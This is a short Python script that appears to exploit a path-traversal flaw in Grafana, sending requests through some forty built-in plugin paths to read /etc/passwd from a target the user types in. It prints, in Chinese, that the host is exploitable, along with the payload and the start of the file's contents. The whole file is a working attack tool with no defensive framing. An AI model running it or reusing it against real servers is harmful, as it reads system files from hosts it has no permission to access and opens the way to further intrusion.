import urllib.request


def run(url):
    plugin_list = [
        '/public/plugins/alertlist/../../../../../../../../etc/passwd',
        '/public/plugins/annolist/../../../../../../../../etc/passwd',
        '/public/plugins/barchart/../../../../../../../../etc/passwd',
        '/public/plugins/cloudwatch/../../../../../../../../etc/passwd',
        '/public/plugins/dashlist/../../../../../../../../etc/passwd',
        '/public/plugins/elasticsearch/../../../../../../../../etc/passwd',
        '/public/plugins/graph/../../../../../../../../etc/passwd',
        '/public/plugins/graphite/../../../../../../../../etc/passwd',
        '/public/plugins/heatmap/../../../../../../../../etc/passwd',
        '/public/plugins/influxdb/../../../../../../../../etc/passwd',
        '/public/plugins/mysql/../../../../../../../../etc/passwd',
        '/public/plugins/opentsdb/../../../../../../../../etc/passwd',
        '/public/plugins/pluginlist/../../../../../../../../etc/passwd',
        '/public/plugins/postgres/../../../../../../../../etc/passwd',
        '/public/plugins/prometheus/../../../../../../../../etc/passwd',
        '/public/plugins/stackdriver/../../../../../../../../etc/passwd',
        '/public/plugins/table/../../../../../../../../etc/passwd',
        '/public/plugins/text/../../../../../../../../etc/passwd',
        '/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd',
        '/public/plugins/bargauge/../../../../../../../../etc/passwd',
        '/public/plugins/gauge/../../../../../../../../etc/passwd',
        '/public/plugins/geomap/../../../../../../../../etc/passwd',
        '/public/plugins/gettingstarted/../../../../../../../../etc/passwd',
        '/public/plugins/histogram/../../../../../../../../etc/passwd',
        '/public/plugins/jaeger/../../../../../../../../etc/passwd',
        '/public/plugins/logs/../../../../../../../../etc/passwd',
        '/public/plugins/loki/../../../../../../../../etc/passwd',
        '/public/plugins/mssql/../../../../../../../../etc/passwd',
        '/public/plugins/news/../../../../../../../../etc/passwd',
        '/public/plugins/nodeGraph/../../../../../../../../etc/passwd',
        '/public/plugins/piechart/../../../../../../../../etc/passwd',
        '/public/plugins/stat/../../../../../../../../etc/passwd',
        '/public/plugins/state-timeline/../../../../../../../../etc/passwd',
        '/public/plugins/status-history/../../../../../../../../etc/passwd',
        '/public/plugins/table-old/../../../../../../../../etc/passwd',
        '/public/plugins/tempo/../../../../../../../../etc/passwd',
        '/public/plugins/testdata/../../../../../../../../etc/passwd',
        '/public/plugins/timeseries/../../../../../../../../etc/passwd',
        '/public/plugins/welcome/../../../../../../../../etc/passwd',
        '/public/plugins/zipkin/../../../../../../../../etc/passwd',
    ]
    headers = {"User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1"}
    for plugin_path in plugin_list:
        paylaod = url + plugin_path
        try:
            re = urllib.request.Request(url=paylaod, headers=headers)
            res = urllib.request.urlopen(re, timeout=3)
            code = res.getcode()
            context = res.read()
            # print("payload：" + paylaod)
            if "root:x" in context.decode('utf-8') and code == 200:
                print("发现漏洞可以利用：")
                print("payload：" + paylaod)
                print("回显：" + context.decode('utf-8')[:32])
                print(url)
                return True
        except:
            return False
    return False


if __name__ == '__main__':
    target = input("target >>> ")
    print(target)
    run(target)
